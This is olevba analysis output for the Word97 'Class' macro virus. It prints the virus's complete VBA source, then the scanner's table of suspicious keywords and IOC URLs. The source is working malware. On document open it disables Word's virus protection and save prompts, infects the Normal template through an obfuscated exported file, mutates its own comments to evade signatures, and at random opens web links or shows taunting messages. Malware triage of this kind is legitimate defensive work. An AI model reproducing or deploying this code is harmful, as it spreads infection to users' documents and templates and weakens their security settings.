olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.x-f03e1d9e2fa2c2a0be0f62ef2a9447a8b9a9231c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.x-f03e1d9e2fa2c2a0be0f62ef2a9447a8b9a9231c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'2516347690050472499361.27006357173062E+2025163476900504724993625163476900
Randomize
'5657747524426484452252.41294135374193E+205657747524426484452255657747524
s = 0: r = 0
'454424292179534291243.61423139944122E+19454424292179534291244544242921
On Error GoTo 87
'28699591841185267693.40166989241396E+1728699591841185267692869959184
Options.VirusProtection = False
'17125909956596820014011.02210858198739E+21171259099565968200140117125909956
Options.SaveNormalPrompt = False
'870041217645761166093.98141006637394E+19870041217645761166098700412176
Options.ConfirmConversions = False
'37432188676185207602816.93272593261359E+20374321886761852076028137432188676
fx = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'194392810094534784411.83768823842041E+19194392810094534784411943928100
xf = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'23258690064816673506251.89947559653489E+21232586900648166735062523258690064
If xf > 90 And fx > 0 Then GoTo 87
'723448609120033936008.6838384031995E+1872344860912003393600723448609
If xf < 90 Then
'10293725764107688355291.10851439733146E+20102937257641076883552910293725764
    Set xs = NormalTemplate.VBProject.VBComponents.Item(1)
'8585134336150467022251.29177959915415E+208585134336150467022258585134336
    ActiveDocument.VBProject.VBComponents.Item(1).Name = xs.Name
'13568289289470143815846.37904730075146E+20135682892894701438158413568289289
    ActiveDocument.VBProject.VBComponents.Item(1).Export Application.StartupPath & Chr(83) + Chr(69) + Chr(69) + Chr(68)
'18590777104569275740251.05832783977024E+21185907771045692757402518590777104
End If
'8809511881474032254.17599273835216E+178809511881474032258809511881
If fx = 0 Then Set xs = ActiveDocument.VBProject.VBComponents.Item(1)
'4342810000480048100002.084757689161E+204342810000480048100004342810000
k = Int(Rnd(1) * 100) + 1
'215268160965848356091.41750545137826E+19215268160965848356092152681609
If k = 99 Then ActiveWindow.WindowState = wdWindowStateMinimize: ActiveDocument.FollowHyperlink Address:="http://www.cannabisculture.com", NewWindow:=False, AddHistory:=False, ExtraInfo:=Chr(67) + Chr(76) + Chr(65) + Chr(83) + Chr(83) + Chr(47) + Chr(83) + Chr(69) + Chr(69) + Chr(68)
'489117456762996981763.7319514265413E+1948911745676299698176489117456
l = Int(Rnd(1) * 75) + 1
'1839123225574791035041.05711154206385E+201839123225574791035041839123225
If l = 74 Then ActiveWindow.WindowState = wdWindowStateMinimize: ActiveDocument.FollowHyperlink Address:="http://www.Microsoft.com", NewWindow:=False, AddHistory:=False, ExtraInfo:=Chr(67) + Chr(76) + Chr(65) + Chr(83) + Chr(83) + Chr(47) + Chr(83) + Chr(69) + Chr(69) + Chr(68)
'1415866384480376806256.80149371622656E+191415866384480376806251415866384
m = Int(Rnd(1) * 50) + 1
'3941416090076891853443.03062788338338E+2039414160900768918534439414160900
If m = 49 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(80) + Chr(82) + Chr(79) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83)
'23972328900104017561212.493543188702E+20239723289001040175612123972328900
n = Int(Rnd(1) * 25) + 1
'10903118724167281001.82388460326944E+17109031187241672810010903118724
If n = 24 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(67) + Chr(76) + Chr(65) + Chr(83) + Chr(83) + Chr(32) + Chr(83) + Chr(69) + Chr(69) + Chr(68)
'3490470158472358840962.52566375067292E+2034904701584723588409634904701584
xs.codemodule.AddFromFile Application.StartupPath & Chr(83) + Chr(69) + Chr(69) + Chr(68)
'20703756544330781518766.84842003366161E+20207037565443307815187620703756544
With xs.codemodule
'1998067060967723024361.35315144238244E+2019980670609677230243619980670609
    For poly = 1 To 4
'432789772966131071212.65346491697749E+194327897729661310712143278977296
    .deletelines 1
'700719668126423712161.85156148147251E+19700719668126423712167007196681
    Next poly
'8860456900355428067843.1492550761466E+208860456900355428067848860456900
End With
'257170694448830746411.255783696233E+19257170694448830746412571706944
If xf < 90 Then
'25285452196143728927693.63425093028784E+20252854521961437289276925285452196
    With xs.codemodule
'244296900386126430019.432948985951E+1824429690038612643001244296900
    .replaceline 1, "Sub AutoClose()"
'35196011236579234929292.03867590795745E+21351960112365792349292935196011236
    .replaceline 93, "Sub ToolsMacro()"
'11687772100140382212891.640755311152E+20116877721001403822128911687772100
    End With
'21990813849405579321008.91901934911482E+20219908138494055793210021990813849
End If
'47810310251831150248.7547861088762E+1747810310251831150244781031025
With xs.codemodule
'3362565712942077276891.41487608562514E+2033625657129420772768933625657129
    For poly = 2 To 92 Step 2
'3420983168129211863049.99332917686825E+1934209831681292118630434209831681
    r = Int(Rnd(412835) * 203989) + 8485
'1483713361174401077212.5876120842927E+191483713361174401077211483713361
    s = Int(Rnd(384958) * 285865) + 2988
'784784196721803448965.66459939362101E+1978478419672180344896784784196
    .replaceline poly, "'" & r * r & s * s & r * r * s * s & r * r & s * s & r * r
'30680675281716070840252.19695369279031E+21306806752817160708402530680675281
Next poly
'10995619600358632693763.94338867670825E+20109956196003586326937610995619600
End With
'6084780025238254660251.44972719755236E+206084780025238254660256084780025
87:
'7597388569814194862816.18575474365122E+207597388569814194862817597388569
If xf > 90 And fx = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'6624169321365899512252.42378032361531E+206624169321365899512256624169321
End Sub
'2358589492914246850253.36024713065697E+1923585894929142468502523585894929
Sub ViewVBCode()
'Word97/Class.Seed by Virus :)
End Sub


















+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.cannabisc|URL                                          |
|          |ulture.com          |                                             |
|IOC       |http://www.Microsoft|URL                                          |
|          |.com                |                                             |
+----------+--------------------+---------------------------------------------+
